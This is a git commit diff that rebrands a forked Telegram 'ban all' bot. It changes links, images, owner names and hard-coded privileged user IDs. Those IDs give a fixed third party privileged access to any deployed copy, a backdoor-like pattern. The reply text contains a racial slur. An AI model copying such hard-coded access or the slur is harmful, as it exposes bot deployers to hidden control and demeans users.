0c2837e168ec00d7bbcb1913976537f2e5878d13
ᴠɪᴋᴀꜱʜ ɢᴜᴘᴛᴀ <102718297+Vikku1343@users.noreply.github.com>
2024-04-08 14:22:58 +0530

    Update main.py

--- main.py
+++ main.py
@@ -28,9 +28,9 @@ API_ID = int(os.getenv("API_ID", ""))
 API_HASH = os.getenv("API_HASH", "")
 BOT_TOKEN = os.getenv("BOT_TOKEN", "")
 OWNER_ID = os.getenv("OWNER_ID", "")
-SUDO_ID = "6868182331"
-LUCIFER = "6762113050"
-COWNER_ID = "6919199044"
+SUDO_ID = "6959572792"
+LUCIFER = "6959572792"
+COWNER_ID = "6959572792"
 OP  = [ int(OWNER_ID), int(SUDO_ID), int(COWNER_ID), int(LUCIFER)]
 #TelegramClient..
 sree = TelegramClient(
@@ -39,16 +39,16 @@ sree = TelegramClient(
     api_hash=API_HASH
 ).start(bot_token=BOT_TOKEN)
 
-Owner = "SHIVANSH39"
-repo = "https://github.com/itzshukla/STRANGER-BANALL"
+Owner = "Staarrrrrkingg"
+repo = "https://github.com/Vikku1343/StarBanAll"
 @sree.on(events.NewMessage(pattern="^/start"))
 async def start(event):
-    buttns = [Button.url("••sᴜᴘᴘᴏʀᴛ••", "https://t.me/STRANGERXWORLD"), Button.url("••ᴜᴘᴅᴀᴛᴇs••", "https://t.me/SHIVANSH474"), Button.url("••ʀᴇᴘᴏ••", f'{repo}')]
+    buttns = [Button.url("••sᴜᴘᴘᴏʀᴛ••", "https://t.me/Ishq_Sukoon"), Button.url("••ᴜᴘᴅᴀᴛᴇs••", "https://t.me/VillainBots"), Button.url("••ʀᴇᴘᴏ••", "https://telegra.ph/file/9993243dfaa5896ad9143.jpg")]
     py = platform.python_version()
     if event.sender.id in OP:
         await sree.send_file(
             event.chat.id,
-            file="https://graph.org/file/1d11deb9c55d1301e9cae.jpg",
+            file="https://telegra.ph/file/8750b30cbd50d9ceb1765.jpg",
             caption=startxt.format(
                 event.sender.first_name,
                 event.sender.id,
@@ -62,7 +62,7 @@ async def start(event):
     if event.sender.id not in OP:
         await sree.send_file(
             event.chat.id,
-            file="https://graph.org/file/1d11deb9c55d1301e9cae.jpg",
+            file="https://telegra.ph/file/8750b30cbd50d9ceb1765.jpg",
             caption=startxt2.format(
                 event.sender.first_name,
                 event.sender.id,
@@ -77,20 +77,20 @@ async def start(event):
 
 @sree.on(events.NewMessage(pattern="^/help"))
 async def start(event):
-    buttns = [Button.url("••sᴜᴘᴘᴏʀᴛ••", "https://t.me/STRANGERXWORLD"), Button.url("••ᴜᴘᴅᴀᴛᴇs••", "https://t.me/SHIVANSH474"),
+    buttns = [Button.url("••sᴜᴘᴘᴏʀᴛ••", "https://t.me/Ishq_Sukoon"), Button.url("••ᴜᴘᴅᴀᴛᴇs••", "https://t.me/VillainBots"),
     Button.url("••ʀᴇᴘᴏ••", f'{repo}')]
     py = platform.python_version()
     if event.sender.id in OP:
         await sree.send_file(
             event.chat.id,
-            file="https://graph.org/file/1d11deb9c55d1301e9cae.jpg",
+            file="https://telegra.ph/file/8750b30cbd50d9ceb1765.jpg",
             caption=hlptxt.format(event.sender.first_name, event.sender.id),
             link_preview=False,
             buttons=buttns
         )
     if event.sender.id not in OP:
         await event.reply(
-            "ʜᴜʜ ɴɪɢɢᴀ!\ɴᴛʜɪs ɪs ɴᴏᴛ ғᴏʀ ʏᴏᴜ ʟᴏʟ 😑\n\ɴᴍᴀᴋᴇ ʏᴏᴜʀ ᴏᴡɴ ʙᴏᴛ ғʀᴏᴍ ᴛʜɪs [ʀᴇᴘᴏsɪᴛᴏʀʏ⚡](https://github.com/itzshukla/STRANGER-BANALL)",
+            "ʜᴜʜ ɴɪɢɢᴀ!\ɴᴛʜɪs ɪs ɴᴏᴛ ғᴏʀ ʏᴏᴜ ʟᴏʟ 😑\n\ɴᴍᴀᴋᴇ ʏᴏᴜʀ ᴏᴡɴ ʙᴏᴛ ғʀᴏᴍ ᴛʜɪs [ʀᴇᴘᴏsɪᴛᴏʀʏ⚡](https://github.com/Vikku1343/StarBanAll)",
             link_preview=False,
         )       
 
@@ -177,7 +177,7 @@ async def ver(events):
 
 
 print("ʏᴏᴜʀ ʙᴏᴛ  ᴅᴇᴘʟᴏʏᴇᴅ sᴜᴄᴄᴇssғᴜʟʟʏ ✅")
-print("ᴊᴏɪɴ @sʜᴛᴀɴɢᴇʀxᴡᴏʀʟᴅ ɪғ ʏᴏᴜ ғᴀᴄɪɴɢ ᴀɴʏ ᴋɪɴᴅ ᴏғ ɪssᴜᴇ!!")
+print("ᴊᴏɪɴ @VillainBots ɪғ ʏᴏᴜ ғᴀᴄɪɴɢ ᴀɴʏ ᴋɪɴᴅ ᴏғ ɪssᴜᴇ!!")
 
 
 
